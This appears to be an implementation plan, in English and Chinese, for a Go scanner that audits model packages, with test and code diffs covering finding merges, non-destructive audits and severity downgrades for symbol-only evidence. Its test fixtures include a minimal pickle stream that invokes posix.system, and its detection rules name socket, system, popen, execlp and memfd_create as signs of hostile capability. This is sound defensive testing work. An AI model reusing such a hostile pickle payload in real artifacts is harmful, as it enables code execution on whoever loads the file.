+// by importance, and it would let a large source arm evict the binary findings
+// entirely. The fixture is the smallest one that shows the difference: three
+// source findings, one binary finding, and a source arm whose own cap was three.
+//
+// The binary finding is DYN_001/MEDIUM rather than a blocked-family HIGH,
+// because the pass assertion below has to survive the merge: what this test
+// pins is the length of the joined list, and a HIGH binary finding would
+// withdraw the pass on its own, making that assertion a statement about
+// severity instead of about capping. MEDIUM does not block under `assist`, so
+// the merge's own recomputation leaves the report passing and a future change
+// that dropped a joined finding shows up as a shorter list.
 func TestMergeBinaryFindingsKeepsBothChannelsFindings(t *testing.T) {
 	report := &Report{ScanComplete: true, FilesCount: 3}
 	for i := 0; i < 3; i++ {
@@ -4027,7 +8674,7 @@ func TestMergeBinaryFindingsKeepsBothChannelsFindings(t *testing.T) {
 	}
 	res := &BinaryScanResult{
 		Findings: []Finding{
-			{File: "/m/z.so", Line: 1, RuleID: "NET_002", Severity: SeverityHigh, Engine: EngineNameBinary},
+			{File: "/m/z.so", Line: 1, RuleID: "DYN_001", Severity: SeverityMedium, Engine: EngineNameBinary},
 		},
 		Summary: BinaryScanSummary{FilesCount: 2},
 	}
@@ -4036,6 +8683,12 @@ func TestMergeBinaryFindingsKeepsBothChannelsFindings(t *testing.T) {
 
 	if len(report.Findings) != 4 {
 		t.Errorf("len(Findings) = %d, want 4: the merge applied a ceiling to the joined list", len(report.Findings))
+	}
+	// The fourth has to be the binary one: a length check alone would also hold
+	// if the merge had dropped a source finding and kept the binary one in its
+	// place.
+	if !containsFileFinding(report.Findings, "/m/z.so", "DYN_001") {
+		t.Error("the binary finding is not in the joined list")
 	}
 	if report.Truncated {
 		t.Error("Truncated = true: the merge re-capped a list both arms had already capped")
@@ -4050,23 +8703,36 @@ func TestMergeBinaryFindingsKeepsBothChannelsFindings(t *testing.T) {
 	}
 }
 
-// TestMergeBinaryFindingsSurfacesTheBinaryCap pins the other half: when the
-// binary arm did drop findings, that drop has to reach the report's own Truncated
-// and not only the summary. scan_metadata.truncated is copied from Truncated, and
-// a reader who checks only the metadata must not be told nothing was dropped.
-func TestMergeBinaryFindingsSurfacesTheBinaryCap(t *testing.T) {
-	report := &Report{ScanComplete: true}
+// TestMergeBinaryFindingsDoesNotFoldTheBinaryCapIntoTruncated pins the decision
+// that keeps the cap from deleting a package.
+//
+// The binary arm's cap drops LOW findings and only LOW (see
+// BinaryScanner.ScanDirectory), and LOW blocks under neither policy, so it
+// cannot have dropped anything that would have blocked the import - but the
+// report's Truncated is a completeness flag
+// that ProvesCleanScan refuses on, and folding this into it would turn "the
+// channel found more than its listing budget" into "the channel did not look".
+// The drop is visible where it belongs: findings_capped and findings_dropped on
+// scan_metadata.binary.
+func TestMergeBinaryFindingsDoesNotFoldTheBinaryCapIntoTruncated(t *testing.T) {
+	report := &Report{ScanComplete: true, ProcessExitCode: 0}
 	res := &BinaryScanResult{
-		Summary:     BinaryScanSummary{FilesCount: 1, Truncated: true},
+		Summary: BinaryScanSummary{FilesCount: 1, FindingsCapped: true, FindingsDropped: 7},
 	}
 
 	MergeBinaryFindings(report, res)
 
-	if !report.Truncated {
-		t.Error("Truncated = false after the binary arm capped itself; the drop is invisible to scan_metadata")
+	if report.Truncated {
+		t.Error("Truncated = true after the binary arm capped itself; the channel refused a package for finding too much")
 	}
-	if report.Passed {
-		t.Error("Passed = true although the binary pass dropped findings")
+	if !report.Passed {
+		t.Error("Passed = false although a capped listing is not a completeness gap: the cap drops only LOW")
+	}
+	if report.Binary == nil || !report.Binary.FindingsCapped || report.Binary.FindingsDropped != 7 {
+		t.Errorf("the cap is not visible on scan_metadata.binary: %+v", report.Binary)
+	}
+	if !report.ProvesCleanScan() {
+		t.Error("ProvesCleanScan() = false for a capped-only binary summary")
 	}
 }
 
@@ -4117,14 +8783,31 @@ go test ./internal/codeaudit/ -run TestMergeBinaryFindings 2>&1 | head -10
 //
 // There is deliberately no cap on the joined list, and no second truncation.
 // Each channel capped its own findings before this ran - the source arm at
-// ScannerConfig.MaxFindings, the binary arm at BinaryConfig.MaxFindings - and
+// Config.MaxFindings, the binary arm at BinaryConfig.MaxFindings - and
 // reapplying one ceiling to the sum would couple them in the one direction that
-// costs a model package. Reaching a cap sets Truncated, Truncated fails
-// ProvesCleanScan, and a scan that cannot prove it looked has the package
-// deleted. A shared ceiling would let a source arm carrying 190 findings and a
-// binary arm carrying 20 push a package that used to import into that state, and
-// it would choose which findings to drop by path order rather than by importance.
-// The ceiling that protects the model is the blocking, not the cap.
+// costs a model package. A shared ceiling would let a large source arm evict
+// binary findings by path order, and it would choose which findings to drop by
+// path order rather than by importance.
+//
+// Nothing here sets Report.Truncated, and that is a decision rather than an
+// omission. Report.Truncated is the completeness flag the report copies into
+// scan_metadata.truncated, and ProvesCleanScan refuses on it: a merge that set
+// it from the binary arm's own cap would make the channel refuse an import for
+// having found too much. The cap drops LOW findings and only LOW (see
+// BinaryScanner.ScanDirectory), and LOW blocks under neither the `assist` nor the
+// `gate` policy - the two severities that can block, HIGH and MEDIUM, are kept
+// whatever the budget - so nothing the cap drops could have blocked the import on
+// its own. A reader who wants the binary cap sees findings_capped and
+// findings_dropped in scan_metadata.binary, next to the max_findings it ran
+// under; what they must not see is a completeness flag that claims a look did not
+// happen when it did.
+//
+// This is the only place the binary channel touches any completeness field on
+// Report, which is worth stating because the other five - ScanComplete,
+// Truncated, ParserErrors, UnsupportedExts and ProcessExitCode - are the source
+// arm's and are read by ProvesCleanScan as such. The binary channel's own gaps
+// travel on Report.Binary and are folded by that method; none of them is written
+// here.
 func MergeBinaryFindings(report *Report, res *BinaryScanResult) {
 	if report == nil || res == nil {
 		return
@@ -4133,22 +8816,24 @@ func MergeBinaryFindings(report *Report, res *BinaryScanResult) {
 	report.Binary = &res.Summary
 
 	// The binary files are added to the count the report states as scanned.
-	// AssembleAuditReport copies this field into Target.FilesScanned, and the
-	// binary channel claims files the source walk never opened - a .so, a .pyc, a
-	// pickle. Leaving the count at the source arm's total would put a number in
-	// target.files_scanned that contradicts scan_metadata.binary.files_count in
-	// the same document, and the lower of the two is the one a reader would
-	// believe.
+	// AssembleAuditReport copies this field into Target.FilesScanned, and leaving
+	// it at the source arm's total would put a number in target.files_scanned that
+	// contradicts scan_metadata.binary.files_count in the same document, where the
+	// lower of the two is the one a reader would believe.
+	//
+	// The sum is not an exact count of distinct files: the two arms count by
+	// different criteria, so a file can be counted twice. The source arm counts by
+	// extension - a path whose extension is not in its set is skipped without
+	// being opened (scanner.go:86-88, scanner.go:280-282) - while this channel
+	// counts by content, so a file with a scannable extension whose bytes are
+	// binary is read by the source walk (and counted there) and then claimed here
+	// as well. Target.FilesScanned is therefore an upper bound on the files that
+	// were looked at, not a census. It is an informational field and no decision
+	// reads it, so the overlap is left in place rather than deduplicated: the
+	// exact per-arm numbers are files_count and
+	// scan_metadata.binary.files_count, and a deduplication pass would need the
+	// claimed paths to stay comparable across both arms.
 	report.FilesCount += res.Summary.FilesCount
-
-	// The binary arm's own cap is folded into the report's Truncated rather than
-	// left on the summary alone. ProvesCleanScan reads both, so the pass decision
-	// is right either way - but scan_metadata.truncated is copied from this field,
-	// and a report whose metadata says nothing was dropped while a channel dropped
-	// fifty findings is the confusion the provenance fields exist to remove.
-	if res.Summary.Truncated {
-		report.Truncated = true
-	}
 
 	claimed := make(map[string]bool, len(res.Claimed))
 	for _, p := range res.Claimed {
@@ -4173,6 +8858,10 @@ func MergeBinaryFindings(report *Report, res *BinaryScanResult) {
 }
 ```
 
+> **两条实现侧的事实，先知道它们就不会被现象误导。** 其一，**`Errored` 的写入者不在本任务，也不在 Task 10**：`BinaryScanner.ScanDirectory` 从不设置它（`binary_scanner.go:35-41` 只有字段声明与注释，全包没有任何赋值点），walk 失败走的是 `return nil, fmt.Errorf("walk directory: %w", err)`（`binary_scanner.go:223`），lstat 失败与非目录同样是 `(nil, error)`（`:111`、`:114`）；`Errored: true` **只**由 Task 12 的 `runBinaryChannel` 在两处构造（Task 12 Step 3 的 `internal/codeaudit/verifier.go`）。所以"`Errored` 会扣包"这条链是 **Task 10 折入**（`ProvesCleanScan` 读 `Errored`）**→ Task 11 透传**（本函数只把 summary 指针挂上 `Report.Binary`，一个字段都不改）**→ Task 12 产生**，三段缺一不可；本任务里没有任何一行会写它，所以它的测试只能像 Step 1 那样直接构造 `BinaryScanSummary`。
+>
+> 其二，**`MergeBinaryFindings` 不是幂等的**：对同一个 `res` 再调一次，`res.Findings` 会被再加一遍、`report.FilesCount` 会再加一遍（丢弃文本 finding 的那一步按 `f.Engine != EngineNameBinary` 判断，而已并入的二进制 finding 的 `Engine` 正好是 `EngineNameBinary`，所以它们不会被清掉）。Task 12 的接线只调一次，今天也没有第二个调用点，所以**记录即可**：不要把它接进任何"重跑/补跑"的路径，也不要为它加去重逻辑（去重要读 `res.Claimed` 的绝对路径，那是另一个会出错的口径）。要再跑一次，就重新构造一份 `Report`。
+
 - [ ] **Step 4: 跑测试确认通过**
 
 ```bash
@@ -4189,12 +8878,501 @@ git add internal/codeaudit/audit.go internal/codeaudit/audit_test.go
 git commit -m "feat(audit): merge binary findings into the audit report"
 ```
 
+> **门禁陷阱：这一步的 `gofmt -l` 给不出信号，别把它当检查用。** HEAD 上 `internal/codeaudit/` 本来就有未格式化的文件——`gofmt -l internal/codeaudit/` 会列出 `audit.go`、`llm.go`、`result_checker.go` 三个，所以这条命令**无论如何**都会打印 `audit.go`，跟本任务改得好不好无关（本步也没有断言输出为空，它只是让人看一眼）。**不要**为了让它"变干净"去跑 `gofmt -w internal/codeaudit/`：那会把 `audit.go` 里既有的、与本任务无关的未格式化 hunk 一并改掉，把这次提交变成混进无关改动的提交——而且会把 `gofmt -l` 这个信号在后续任务里彻底变成真空。真要判格式，判据是仓库既有的那道闸门基线，不是"这条命令有没有输出"。
+
 ---
+
+### Task 11a: 审计过程不得删除或改动模型包与依赖库
+
+**决策**：审计只做审计。**整个审计过程不得删除模型包，不得对被打包的源代码与依赖库做任何改动动作。** 当前实现违反这一点，且违反的地方是可枚举的——所以先量后改：
+
+- `internal/codeaudit` 全包**没有任何文件写入**（`grep -rn "os\.OpenFile\|os\.WriteFile\|ioutil\.WriteFile\|os\.Symlink\|os\.Link(" internal/codeaudit/*.go` 无命中），唯一的外部进程是一次 semgrep CLI 调用（`semgrep_engine.go:555`），它的规则文件是部署时就位的、不写进被扫描目录。所以通道本身是只读的。
+- 全仓库没有 `pip install` / `requirements.txt` 之类的依赖安装步骤，模型包自带的那批 `.so` 不会被安装动作改写。
+- 因此**审计路径上的破坏性动作有四处**，全部在 `internal/controller`，全部是 `cleanDirContents(s.Security.ModelDir)`：`import_processing.go:635-637`（fail-closed 且 LLM 不可用）、`:645-647`（审计返回 error）、`:658-660`（结论未通过），以及 panic 回滚路径 `route.go:861-865`。`cleanDirContents` → `utils.CleanDir`（`import_helpers.go:74-77`），注释自述"清空 dir 目录下的所有文件和子目录"。
+- **另有两条恢复路径删的是同一个目录，首轮量漏了**：`internal/app/taa/recovery.go:276`（`reconcileAbandonedAudit`）与 `:95`（`reconcileCrashRecovery` 的 `model_import` 分支）。两条互斥：审计是异步的、会把导入任务先释放掉，所以审计中途崩溃时 `activeTask` 为 nil，只有 `PendingAudit` 记得它——`:276` 正是"审计被打断 → 删包"这条路本身。两条自述的理由都是"未审计的代码不得留在盘上"，而同等隔离已由紧随其后的 `UpdateImportState(true, false, ...)` 提供，删除并不是唯一防线。
+
+**保留什么（这是本任务的边界，不要顺手改掉）**：审计仍然是闸门。结论照样判出、照样经 `reportAuditAsync` 上报、未通过照样不算导入成功——`launchModelAudit`（`import_processing.go:594-605`）在 `!passed` 时清的是**导入状态标记**（`clearImportedState` → `updateImportState(..., false, ...)`，`import_processing.go:913-915`）并停止训练，两者都不触碰文件，保留。被拿掉的只有"物理清除"这一个动作：**审计的结论改变的是"这次导入是否被接受"，而不是"磁盘上还剩什么"。**
+
+**改动后的后果，必须原样写进注释与风险表**：一次误报 HIGH 的代价从"删掉用户的模型包"变成"这次导入被拒、用户看到一份说不安全的报告"；一次漏报的代价从"包被留下但已被删过"变成"一个没被完整看过的包被判通过"。两个方向都还在，但都变成了**报告层面**的后果，不再有不可逆的文件损失。这正是 `rules.go`/`binary_scanner.go`/`binary_rules.go` 里那些"否则会删包"的注释必须改写的原因：它们描述的行为将不再存在。
+
+**Files:**
+- Modify: `internal/controller/import_processing.go`（三处删除动作 + 相关日志）
+- Modify: `internal/controller/route.go`（panic 回滚路径的一处）
+- Modify: `internal/codeaudit/binary_rules.go:26-28`、`internal/codeaudit/binary_scanner.go:262-272`（"否则删包"的注释改成真实后果）
+- Test: `internal/controller/`（新增"失败审计不动文件"的钉子）
+- Test: `internal/codeaudit/binary_rules_test.go:208`、`:364`（两处注释同步）
+
+- [ ] **Step 1: 写失败测试**
+
+在现有审计测试所在文件（`internal/controller/audit_model_import_test.go`，先确认它与相邻测试如何驱动 `auditAndReportModelImport`/`launchModelAudit`，按该文件的既有模式驱动，不要新造一套）追加：
+
+```go
+// TestFailedAuditLeavesTheImportedPackageUntouched pins the rule the audit is
+// under: it reads, it judges, it reports, and it changes nothing. The failure it
+// guards is not hypothetical - the audit gate used to call cleanDirContents on
+// the model directory whenever the verdict was not a pass, so a false positive
+// did not just refuse an import, it destroyed the artifact the operator had
+// uploaded.
+//
+// The whole tree is compared, not one path: "we only deleted the checkpoints"
+// is the same defect with a smaller blast radius, and the dependency libraries a
+// model package bundles live in that same tree.
+func TestFailedAuditLeavesTheImportedPackageUntouched(t *testing.T) {
+	// Build a package that fails the audit (the fixture the neighbouring tests
+	// already use for a non-passing verdict) and record the tree before the run.
+	before := snapshotTree(t, modelDir)
+
+	passed := state.auditAndReportModelImport(req)
+
+	if passed {
+		t.Fatal("fixture is wrong: this package is supposed to fail the audit")
+	}
+	after := snapshotTree(t, modelDir)
+	if !reflect.DeepEqual(before, after) {
+		t.Errorf("the audit changed the package it audited:\n before: %v\n after:  %v", before, after)
+	}
+}
+```
+
+`snapshotTree` 记录每个文件的相对路径、大小与内容摘要（按路径排序）；若同文件已有等价辅助函数就复用。
+
+- [ ] **Step 2: 跑测试，确认失败**
+
+```bash
+go test ./internal/controller/ -run TestFailedAuditLeavesTheImportedPackageUntouched -count=1 -v 2>&1 | tail -20
+```
+
+Expected: FAIL，`after` 为空树（或只剩目录本身）。若它直接通过，说明夹具走的不是未通过分支——先改夹具，不要改断言。
+
+- [ ] **Step 3: 去掉四处删除动作**
+
+把 `import_processing.go:635-637`、`:645-647`、`:658-660` 三处 `if err := cleanDirContents(s.Security.ModelDir); err != nil { ... }` 整块删掉，`route.go:861-865` 的同类块一并删掉（保留 panic 路径其余的状态回滚、`stopActiveTraining`、panic 上报）。**不要**动 `import_processing.go:342`/`:383`/`:434`/`:528`/`:531`——那是训练的工作目录与产物目录，不是模型包，且不在审计路径上（改动前先逐一确认这一点并在报告里写明）。
+
+日志：三处 `"物理清除已解压模型代码失败"` 随代码消失。取而代之，在结论未通过时补一行说明审计**没有**动过文件，例如：
+
+```go
+s.Logs.Add(LogWarn, "audit", "审计未通过：仅上报结论，未删除或改动模型包与依赖库: dir=%s", s.Security.ModelDir)
+```
+
+**这句话不是客套**：此前失败日志与"已物理清除"是配对的，去掉删除而不留话，运维会去找一个其实还在的包（或者更糟——以为包已被清掉而不再处理）。
+
+- [ ] **Step 4: 注释与文档同步（本仓库最常出错的一类）**
+
+`internal/codeaudit/binary_rules.go:26-28` 现在写的是"A false `Passed` makes …run cleanDirContents and delete the model package"，`binary_scanner.go:262-272` 写的是 MEDIUM 在 `gate` 下"deletes the package"。这些句子在 Step 3 之后**全部为假**，必须改成真实后果：误报改变的是**这次导入是否被接受**，不再有任何文件被删。`binary_rules_test.go:208`、`:364` 两处测试注释同理。
+
+改写时保留原本的推理强度（这些注释存在的理由是解释严重级别为何被定成那样），只把后果从"删包"换成"拒绝导入 + 一份错误的报告"。加一句明确的边界：**审计从不写、不删、不改它读的东西**，并指向该契约的实现处。
+
+- [ ] **Step 5: 跑测试并提交**
+
+```bash
+go test ./internal/controller/ ./internal/codeaudit/ -count=1
+go build ./... && CGO_ENABLED=0 GOOS=linux go build -o bin/taa ./cmd/taa
+git add internal/controller/import_processing.go internal/controller/route.go internal/controller/audit_model_import_test.go internal/codeaudit/binary_rules.go internal/codeaudit/binary_scanner.go internal/codeaudit/binary_rules_test.go
+git commit -m "fix(audit): never delete or modify the package being audited"
+```
+
+**补充（本轮追加，已实施）**：首轮只覆盖审计路径与点名的注释，复核发现两处缺口，随后以两个提交补齐：
+
+- `a3ea354` `docs(audit): finish the comment sweep for the non-destructive audit`——把仍然声称"判错会删包"的注释与测试错误串一次扫净。首轮只改了任务点名的几处，漏了 `binary_rules.go:128`、`binary_rules_test.go` 的 `TestBinaryFamilySeveritiesArePinned` 文档（一处两句）、`audit_test.go:1033` 与 `:1052`、`binary_evidence.go:473/486/758`、`binary_evidence_test.go:1395`，以及 `engine.go`、`engine_select_test.go`、`config.go`、`config_test.go`、`app_test.go`、`model_audit_pending_test.go`、`route.go:392`。判据是"这句在改动后是否还成立"，不是"是否被点名"。
+- `a4acbbf` `fix(audit): stop deleting the model directory on the recovery path`——去掉 `recovery.go:95` 与 `:276` 的两处 `CleanDir(ModelDir)`，**保留**状态复位、`LogWarn` 与平台补报（code=2）。同时把 `TestRecovery_ModelImportQuarantine` 与 `TestRecovery_AbandonedAuditQuarantine` 从"断言目录被清空"翻成"断言整树逐字节未变"，并改写假定发生清除的中文日志与平台文案（"模型已隔离，请重新下发模型"→"本次导入被拒绝，模型包保持上传原样、不得视为已导入，请重新下发模型"）。
+
+**边界因此扩大一句**：本任务约束的不是"`internal/controller` 里的那几个调用点"，而是**任何以"审计未完成/未通过"为由触碰模型包与其依赖库的动作**，崩溃恢复路径包括在内。回滚的含义也随之从"文件回到原状"（本来就没有文件被改动）变成"导入状态回到未导入"。
+
+### Task 11b: 佐证门控 —— 仅凭符号名不得单独升 HIGH
+
+**背景（实测，不是推测）**
+
+`NET_002`、`CMD_001`、`BIN_002` 三个 HIGH 族的证据是 `.dynsym` 的一项或一个 `DT_NEEDED` 名字。链接器会把目标文件可能引用的**每一个**符号都写进去，所以"表里有 `socket`"只说明这个库**有能力**调用 socket，不说明它调用。在这台机器上按现状实测：`libllama-common.so.0.1.2` 与 `libllama-server-impl.so` 在 `httplib::detail::*` 里导入 `socket`/`connect`/`getaddrinfo`/`inet_pton`，`libggml-base.so.0.20.2` 在 `ggml_print_backtrace` 里导入 `execlp`，`libgfortran.so.5.0.0` 导入 `system`，`libcudart.so.12`/`libcudnn_*.so` 导入 `socket`/`connect`。默认 `assist` 下 `passed = highCount == 0`，所以上面任意一个都让 `launchModelAudit` 拒绝这次导入并留下一份说这个包不安全的报告（`internal/controller/import_processing.go:655-660` 的 `cleanDirContents` 已由 Task 11a 移除）。
+
+**可达性（调用图）曾作为修正方案被实测否决**：这批 C++/Rust 目标文件没开 `-fvisibility=hidden`，`libllama-common` 在 `.dynsym` 里定义/弱定义 **2878/2881** 个函数，`socket` 的调用者本身就是导出入口，9 个被标记的库**一个都翻不了案**；而且 guest rootfs 里没有任何反汇编器（payload rootfs 的 `usr/bin` 只有一个 `python3.10`），`golang.org/x/arch` 离线不可得。
+
+**本次采用的门控，以及两个已决事项**
+
+存在性证据只有在**同一文件**内获得**独立佐证**时才报 HIGH。佐证集合只有两个：
+
+- `BIN_001`（`SourceEntropy`）：可执行节区熵接近随机的**测量**。它量的是字节，不是文件的自述，任何"起个名字"都造不出来。
+- `PKL_001`（`SourcePickle`）：pickle 解释器**真的走完了 opcode 流**并解析出一个具备进程/IO/网络能力的 `module.attribute` 目标。这是一次 committed parse，与符号表无关。
+
+**不得作为佐证**（这是本任务最容易被写错的一处）：
+
+- `BIN_002`（`memfd_create`/`fexecve`）：它本身就是 `.dynsym` 里的一个名字，与待证事项**同一类**证据；接受它等于允许载荷引用一个无关符号自证。
+- "另一个符号族共现"（如 `socket` + `system`）：同样是同一类证据数两遍。合法大库天然两者都有（`libllama-common` 有网络符号，`libggml-base` 有 `execlp`），这条一加，本任务要救的库一个都救不了。
+
+**级别取 LOW，不取 MEDIUM**（已决）：`assist` 只看 HIGH，`gate` 看 HIGH 或 MEDIUM（`internal/codeaudit/audit.go:304-312`），所以 MEDIUM 在 `gate` 下照样阻断——那不是修复，是同一个阻断换个数字。LOW 是两种策略下都不阻断的唯一取值（`rules.go` 没有 `SeverityLow` 常量，表里写裸字符串）。
+
+**`BIN_002` 一并纳入降级范围**（已决）：它与 `NET_002`/`CMD_001` 同为"仅凭符号名"的 HIGH 族，按同一规则处理，不写成例外。
+
+**代价，必须原样写进注释**：未加壳、只调 `socket` 或只调 `system` 的 `.so` 从此不再静态阻断，只剩 Tier-2 语义分析这一道（该 finding 仍然进报告、仍然送给模型，模型可凭自身证据判 MALICIOUS，`audit.go:212-252` 会把 MALICIOUS 分类为 HIGH 并阻断）。已加壳的载荷不受影响（`BIN_001` 无条件 HIGH）。**降级去掉的是一次自动阻断，不是 finding 本身；没有佐证不等于无害。**
+
+**为什么判定必须在截断之前**：`ScanDirectory` 的截断契约是"只丢弃它确知为 LOW 的"（`binary_scanner.go:283-308`，keep 规则 `len(kept) < MaxFindings || f.Severity != "LOW"`）。先截断后降级会得到一个"截断按 HIGH 判定保留、报告里写着 LOW"的 finding——截断推理的级别与报告承载的级别不一致；而且 `TestBinaryScannerCapKeepsLowFindingsWithinTheBudget`、`TestBinaryScannerCapWithNothingDroppableIsNotCapped` 会**变绿但前提失效**（"四个 HIGH 都不可丢"不再成立）。
+
+**为什么判定在扫描器而不是规则表**：`BinaryMatcher.Match` 一次只看一行证据（`binary_rules.go:383-396`），看不到共现；`MergeBinaryFindings` 只有 finding、没有证据。判定属于"按文件看到全部证据"的那一层，即 `ScanDirectory`。规则表**不能**改：`NET_002`/`CMD_001`/`DYN_001` 的 id 与级别是从 `DefaultRules()` 借来的，`TestBinaryRulesBorrowSharedFamilies` 钉住两个通道不得对同一 id 报不同级别；降级作用在 **Finding** 上、从不作用在 **Rule** 上，所以 `matcher.Rules()` 不变。两个通道描述的本就不是同一件事：源码臂的 `NET_002` 是**会执行**的代码里出现 `socket.socket(`，二进制臂的是符号表里可能出现的一个名字。
+
+**Files:**
+- Modify: `internal/codeaudit/rules.go`（`Finding` 增加降级原因字段）
+- Modify: `internal/codeaudit/binary_rules.go`（族分类谓词 + matcher 查询 + 表头注释改写）
+- Modify: `internal/codeaudit/binary_scanner.go`（`BinaryScanSummary.PresenceDowngraded`；`ScanDirectory` 按文件降级）
+- Test: `internal/codeaudit/binary_scanner_test.go`（三个既有截断测试必须改；新增行为测试）
+- Test: `internal/codeaudit/binary_rules_test.go`（分类钉子；两处注释性断言文字修正）
+
+- [ ] **Step 1: 写失败测试（先钉住最容易被写错的那条）**
+
+在 `binary_scanner_test.go` 追加。**夹具字段名以 `binary_fixtures_test.go` 现状为准**（设计期读到的是 `elfSpec{imports, text, textExec}` 与 `uniformBytes(n)`；若实际不同，按实际改并在报告里说明）：
+
+```go
+// TestBinaryScannerDoesNotLetTwoPresenceFamiliesCorroborateEachOther is the test
+// that protects the whole change. Two families that both read the dynamic symbol
+// table are the same class of evidence counted twice, and a large legitimate
+// library carries both: on this host libllama-common.so imports socket/connect/
+// getaddrinfo while libggml-base.so imports execlp. So an implementation that
+// treats "a second blocking family is present" as corroboration would keep every
+// file this rule exists to clear, and this fixture is the smallest one that
+// distinguishes it: two presence families, no measurement and no pickle parse.
+func TestBinaryScannerDoesNotLetTwoPresenceFamiliesCorroborateEachOther(t *testing.T) {
+	dir := t.TempDir()
+	writeFixture(t, dir, "libboth.so", elfFixtureBytes(t, elfSpec{imports: []string{"socket", "system"}}))
+
+	res, err := NewBinaryScanner(nil, BinaryConfig{}).ScanDirectory(dir)
+	if err != nil {
+		t.Fatalf("ScanDirectory: %v", err)
+	}
+
+	net := findFinding(t, res.Findings, "NET_002")
+	cmd := findFinding(t, res.Findings, "CMD_001")
+	for _, f := range []Finding{net, cmd} {
+		if f.Severity != "LOW" {
+			t.Errorf("%s severity = %q, want LOW: a presence family was corroborated by another presence family", f.RuleID, f.Severity)
+		}
+		if f.DowngradeReason == "" {
+			t.Errorf("%s carries no downgrade reason: a reader cannot tell why it is not HIGH", f.RuleID)
+		}
+	}
+	if res.Summary.PresenceDowngraded != 2 {
+		t.Errorf("PresenceDowngraded = %d, want 2", res.Summary.PresenceDowngraded)
+	}
+}
+
+// TestBinaryScannerKeepsAPresenceFamilyHighWhenTheFileIsPacked is the other half:
+// corroboration has to actually work, or the rule is just a suppression.
+func TestBinaryScannerKeepsAPresenceFamilyHighWhenTheFileIsPacked(t *testing.T) {
+	dir := t.TempDir()
+	writeFixture(t, dir, "libpacked.so", elfFixtureBytes(t, elfSpec{
+		imports:  []string{"socket"},
+		text:     uniformBytes(512),
+		textExec: true,
+	}))
+
+	res, err := NewBinaryScanner(nil, BinaryConfig{}).ScanDirectory(dir)
+	if err != nil {
+		t.Fatalf("ScanDirectory: %v", err)
+	}
+
+	if f := findFinding(t, res.Findings, "NET_002"); f.Severity != SeverityHigh {
+		t.Errorf("NET_002 severity = %q, want HIGH: a measured near-random executable section corroborates it", f.Severity)
+	}
+	if f := findFinding(t, res.Findings, "BIN_001"); f.Severity != SeverityHigh {
+		t.Errorf("BIN_001 severity = %q, want HIGH: the entropy measurement is not itself a presence claim", f.Severity)
+	}
+	if res.Summary.PresenceDowngraded != 0 {
+		t.Errorf("PresenceDowngraded = %d, want 0", res.Summary.PresenceDowngraded)
+	}
+}
+
+// TestBinaryScannerCorroboratesAcrossArchiveMembers pins the granularity. The
+// corroborator does not have to be in the same member: a .pt that carries a
+// socket-importing ELF member and a process-executing data.pkl is one artifact
+// whose parts run together, and collectArchive routes both members through one
+// EvidenceSet.
+func TestBinaryScannerCorroboratesAcrossArchiveMembers(t *testing.T) {
+	dir := t.TempDir()
+	writeFixture(t, dir, "model.pt", zipFixture(t, map[string][]byte{
+		"lib/x.so":       elfFixtureBytes(t, elfSpec{imports: []string{"socket"}}),
+		"archive/data.pkl": []byte("cposix\nsystem\n."),
+	}))
+
+	res, err := NewBinaryScanner(nil, BinaryConfig{}).ScanDirectory(dir)
+	if err != nil {
+		t.Fatalf("ScanDirectory: %v", err)
+	}
+
+	if f := findFinding(t, res.Findings, "NET_002"); f.Severity != SeverityHigh {
+		t.Errorf("NET_002 severity = %q, want HIGH: the same file carries a committed pickle parse", f.Severity)
+	}
+}
+
+// TestBinaryScannerDowngradeHappensBeforeTheCap is the only test that can tell
+// the two orderings apart, so it is not optional. Downgrading after the cap would
+// leave the cap reasoning about HIGH while the report says LOW, and it would keep
+// findings the cap was supposed to be allowed to spend.
+func TestBinaryScannerDowngradeHappensBeforeTheCap(t *testing.T) {
+	dir := t.TempDir()
+	writeFixture(t, dir, "libmany.so", elfFixtureBytes(t, elfSpec{
+		imports: []string{"socket", "connect", "system", "popen"},
+	}))
+
+	res, err := NewBinaryScanner(nil, BinaryConfig{MaxFindings: 2}).ScanDirectory(dir)
+	if err != nil {
+		t.Fatalf("ScanDirectory: %v", err)
+	}
+
+	if len(res.Findings) != 2 {
+		t.Errorf("len(Findings) = %d, want 2: a downgraded finding is spendable, so the cap can drop it", len(res.Findings))
+	}
+	if !res.Summary.FindingsCapped || res.Summary.FindingsDropped != 2 {
+		t.Errorf("capped = %v, dropped = %d, want true/2", res.Summary.FindingsCapped, res.Summary.FindingsDropped)
+	}
+	if res.Summary.PresenceDowngraded != 4 {
+		t.Errorf("PresenceDowngraded = %d, want 4: the count is taken at downgrade time, not at keep time", res.Summary.PresenceDowngraded)
+	}
+}
+
+// TestBinaryScannerDowngradedEvidenceDoesNotBlockUnderEitherPolicy pins the
+// severity the decision needs. It asserts both policies, because assist passes on
+// a MEDIUM downgrade too - only the gate assertion distinguishes LOW from MEDIUM,
+// and MEDIUM under gate refuses the import.
+func TestBinaryScannerDowngradedEvidenceDoesNotBlockUnderEitherPolicy(t *testing.T) {
+	dir := t.TempDir()
+	writeFixture(t, dir, "libnet.so", elfFixtureBytes(t, elfSpec{imports: []string{"socket"}}))
+
+	res, err := NewBinaryScanner(nil, BinaryConfig{}).ScanDirectory(dir)
+	if err != nil {
+		t.Fatalf("ScanDirectory: %v", err)
+	}
+	report := &Report{ScanComplete: true}
+	MergeBinaryFindings(report, res)
+
+	if report.HighCount != 0 {
+		t.Fatalf("HighCount = %d, want 0", report.HighCount)
+	}
+	if report.MediumCount != 0 {
+		t.Fatalf("MediumCount = %d, want 0: MEDIUM blocks under gate, so a MEDIUM downgrade is not a fix", report.MediumCount)
+	}
+	stats := ComputeStatistics(report.Findings)
+	for _, mode := range []string{"assist", "gate"} {
+		concl := ComputeConclusionContext(stats, nil, mode, report.ProvesCleanScan(), false, nil)
+		if !concl.Passed {
+			t.Errorf("policy %s: passed = false for a package whose only evidence is a symbol name", mode)
+		}
+	}
+}
+```
+
+`findFinding` 若包里已有等价辅助函数就复用，不要重名（先在 `grep -rn "func findFinding\|func writeFixture" internal/codeaudit/` 里确认；`elfFixtureBytes`/`zipFixture`/`uniformBytes` 的签名同理以现状为准）。
+
+在 `binary_rules_test.go` 追加分类钉子：
+
+```go
+// TestBinaryFamilyClassificationIsPinned pins the two predicates by name, so that
+// a family added later is classified deliberately rather than by accident.
+// Downgradable is exactly the presence-only HIGH families: BIN_002 because its
+// evidence is a dynsym entry like the other two, and DYN_001 not at all, because
+// it declares MEDIUM and can never produce the HIGH this rule gates.
+func TestBinaryFamilyClassificationIsPinned(t *testing.T) {
+	m, err := NewBinaryMatcher()
+	if err != nil {
+		t.Fatalf("NewBinaryMatcher: %v", err)
+	}
+
